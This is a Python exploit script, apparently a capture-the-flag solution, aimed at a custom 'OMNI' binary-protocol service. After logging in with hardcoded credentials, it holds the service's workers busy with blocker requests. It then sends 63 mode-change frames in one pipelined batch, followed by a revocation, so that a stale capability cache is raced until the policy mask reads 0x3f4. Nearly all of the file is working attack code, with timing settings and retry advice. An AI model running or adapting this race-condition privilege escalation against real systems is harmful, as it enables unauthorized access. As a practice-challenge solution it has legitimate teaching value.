#!/usr/bin/env python3
import os
import socket
import struct
import threading
import time

HOST = os.environ.get("OMNI_HOST", "127.0.0.1")
PORT = int(os.environ.get("OMNI_PORT", "7878"))
JOBS = int(os.environ.get("OMNI_JOBS", "63"))
# The service clamps transform work to 500 ms.  We queue/revoke shortly
# before that clamp expires so workers run inside the stale-cache window.
BLOCK_MS = int(os.environ.get("OMNI_BLOCK_MS", "3000"))
BLOCKERS = int(os.environ.get("OMNI_BLOCKERS", "10"))
RELEASE_DELAY = float(os.environ.get("OMNI_RELEASE_DELAY", "2.40"))


def field(value):
    return struct.pack(">H", len(value)) + value


def recvn(sock, size):
    output = b""
    while len(output) < size:
        part = sock.recv(size - len(output))
        if not part:
            raise EOFError("connection closed")
        output += part
    return output


class Client:
    def __init__(self):
        self.sock = socket.create_connection((HOST, PORT), timeout=30)
        self.sock.settimeout(30)
        self.rid = 0

    def frame(self, opcode, body=b""):
        self.rid += 1
        return struct.pack(">4sBBHII", b"OMNI", 1, 0,
                           opcode, self.rid, len(body)) + body

    def response(self):
        header = recvn(self.sock, 16)
        magic, version, flags, opcode, rid, length = struct.unpack(
            ">4sBBHII", header
        )
        if magic != b"OMNI" or version != 1:
            raise RuntimeError("invalid response header")
        return flags, opcode, rid, recvn(self.sock, length)

    def request(self, opcode, body=b""):
        self.sock.sendall(self.frame(opcode, body))
        flags, _, _, response = self.response()
        return flags, response

    def auth(self):
        flags, body = self.request(
            0x10, field(b"ben.tennyson") + field(b"its-hero-time")
        )
        if flags != 1:
            raise RuntimeError(f"authentication failed: {body!r}")
        print(f"[+] Authenticated: {body[:16].hex()}")

    def lease(self, capability):
        flags, body = self.request(
            0x20, field(capability) + struct.pack(">I", 300)
        )
        if flags != 1:
            raise RuntimeError(f"lease failed: {body!r}")
        lease_id = body[:16]
        print(f"[+] Lease {capability.decode()}: {lease_id.hex()}")
        return lease_id


def blocker(client, lease_id, number):
    body = (
        lease_id
        + field(b"echo")
        + struct.pack(">II", BLOCK_MS, 0)
    )
    try:
        flags, response = client.request(0x41, body)
        print(f"[*] Blocker {number} released: flags=0x{flags:02x} "
              f"response={response!r}")
    except Exception as exc:
        # A handler timeout is expected; the background worker remains occupied.
        print(f"[*] Blocker {number} handler ended: {exc}")


def diagnostic(client):
    flags, body = client.request(0x51)
    if flags != 1 or len(body) < 22:
        raise RuntimeError(f"diagnostic failed: {body!r}")
    return {
        "state": body[0],
        "mode": body[1],
        "mask": struct.unpack(">I", body[2:6])[0],
        "generation": int.from_bytes(body[14:22], "big"),
    }


def main():
    print(f"[*] Connecting to {HOST}:{PORT}")

    main_client = Client()
    main_client.auth()
    matrix = main_client.lease(b"matrix.configure")
    starting_generation = diagnostic(main_client)["generation"]

    blockers = []
    for number in range(1, BLOCKERS + 1):
        client = Client()
        client.auth()
        lease = client.lease(b"dna.shift")
        blockers.append((client, lease, number))

    print("[*] Waiting for capability-cache refresh...")
    time.sleep(1.5)

    threads = []
    waves = (BLOCKERS + 1) // 2
    print(f"[*] Queueing {BLOCKERS} blockers ({waves} worker waves)...")
    for client, lease, number in blockers:
        thread = threading.Thread(
            target=blocker, args=(client, lease, number), daemon=True
        )
        thread.start()
        threads.append(thread)

    # The worker cost is clamped to 500 ms.  Submit the batch close to its
    # release, leaving only a small stale-cache window after revocation.
    time.sleep(RELEASE_DELAY)

    print(f"[*] Pipelining {JOBS} mode changes and the revocation...")
    batch = bytearray()
    for _ in range(JOBS):
        batch += main_client.frame(0x50, matrix + b"\x02")
    batch += main_client.frame(0x21, matrix)
    main_client.sock.sendall(batch)

    accepted = 0
    for index in range(JOBS):
        flags, opcode, rid, body = main_client.response()
        if opcode != 0x50:
            raise RuntimeError(f"unexpected opcode 0x{opcode:04x}")
        if flags == 1:
            accepted += 1
        else:
            print(f"[-] Mode request {index + 1} rejected: {body!r}")

    flags, opcode, rid, revoke_body = main_client.response()
    print(f"[+] Accepted mode changes: {accepted}/{JOBS}")
    print(f"[+] Revoke: flags=0x{flags:02x} body={revoke_body.hex()}")

    print("[*] Polling while the worker queue drains...")
    deadline = time.monotonic() + 8
    last = None
    while time.monotonic() < deadline:
        time.sleep(0.75)
        current = diagnostic(main_client)
        signature = (current["mask"], current["generation"])
        if signature != last:
            print(f"    mask=0x{current['mask']:08x} "
                  f"generation={current['generation']}")
            last = signature
        if current["mask"] == 0x3F4:
            print("\n[+] Race succeeded: policy mask is 0x000003f4")
            print("[+] Run the final engage stage against this same port now.")
            return
        if current["generation"] >= starting_generation + accepted:
            break

    current = diagnostic(main_client)
    print("\n[-] Race did not land.")
    print(f"[-] Final mask=0x{current['mask']:08x}, "
          f"generation={current['generation']}")
    print("[-] Retry with 63 jobs and a nearby delay such as 0.46 or 0.48.")


if __name__ == "__main__":
    main()
